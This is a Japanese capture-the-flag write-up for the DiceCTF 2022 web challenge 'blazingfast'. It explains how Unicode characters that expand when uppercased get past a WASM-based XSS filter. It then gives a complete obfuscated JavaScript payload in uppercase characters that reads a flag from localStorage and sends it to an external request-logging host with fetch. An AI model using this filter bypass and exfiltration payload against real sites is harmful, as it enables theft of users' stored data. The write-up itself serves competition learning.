---
layout: chall
ctf_name: DiceCTF_2022
problem_name: blazingfast
genre: web
solved_date: 2022-02-05
during_ctf: true
tag: [wasm, unicode, jsfuck]
---

### 概要

WASM にて実装されている MoCkINg CaSe 化と、それをラップする HTML アプリケーションが与えられる。Admin Bot に対して XSS できれば勝ち。

[!details:コード:(!src:blazingfast.c:c)

(!src:index.js:js)]

### 解法

Unicode には、正規化処理を行う時に複数文字として処理される文字が存在する。例えば、文字 `ﬄ` は `FFL` といったように複数文字になる。これを用いて、wasm モジュール内で行われている XSS チェックをバイパスすることができる。

バイパスした後は、大文字化された文字によってスクリプトを組まなければいけない。また、入力には 1000 文字の文字数制限がある。バイパスのために 1/3 を特殊文字で埋めなければいけないため、実質的に 666 文字制限となっている。

BigInt.toString(36) にて 36 進数としての文字列化ができることを用いるために、toString に必要な文字を `(![]+[])` が `"false"` として評価されるといったことを用いて作った。結果として、スクリプトは特段の文字列削減の工夫をせずともおおよそ 500 文字程度となった。

```js
// "false"
FA=![]+[];
// "true"
TR=!![]+[];
// "[object Object]"
OB={}+[];
// "undefined"
UN=""[0]+[];
// "constructor"
CT=`${OB[5]}${OB[1]}${UN[6]}${FA[3]}${OB[6]}${TR[1]}${TR[2]}${OB[5]}${OB[6]}${OB[1]}${TR[1]}`;
// "function String() { [native code] }"
ST=([]+[])[CT]+[];
// "toString"
TS=`${TR[0]}${OB[1]}S${TR[0]}${TR[1]}${UN[5]}${UN[6]}${ST[14]}`;

// X => eval(`${X}n`).toString(36)
F=(X)=>E(`${X}${UN[1]}`)[TS](36);
// E=eval
F[CT](`E=${(693741)[TS](36)}`)();

// eval('localStorage.getItem("flag")')
FLAG=E(`${F("36407613")}S${F("1795103150")}.${F("21269")}I${F("38110")}("${F("727432")}")`);

FETCH=F("25885457");
HTTPS=F("29945008");
RI=F("6059548247909300458845003");
COM=F("16438");
INSPECT=F("40621018349");
// eval('fetch("https://requestinspector.com/inspect/NEKO?fakeflag")')
E(`${FETCH}("${HTTPS}://${RI}.${COM}/${INSPECT}/NEKO?${FLAG}")`);
```

